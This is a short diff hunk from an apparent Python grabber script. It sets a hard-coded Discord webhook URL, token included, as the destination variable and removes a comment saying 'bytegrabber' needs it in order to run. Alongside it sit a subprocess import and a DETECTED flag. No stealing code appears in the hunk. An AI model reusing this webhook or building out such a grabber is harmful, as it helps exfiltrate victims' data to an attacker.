@@ -16,7 +16,7 @@ import re
 import subprocess
 
 
-hook = "https://discord.com/api/webhooks/1059609054936313936/nAZbSoXA-eZG6YelIzlwHxen_eTRdybrUJ9ZUlntWhp351_Kq6CsLMRgBKm3iMmlX0e6" -- Do not change or bytegrabber won't execute
+hook = "https://discord.com/api/webhooks/1059609054936313936/nAZbSoXA-eZG6YelIzlwHxen_eTRdybrUJ9ZUlntWhp351_Kq6CsLMRgBKm3iMmlX0e6"
 
 
 DETECTED = False
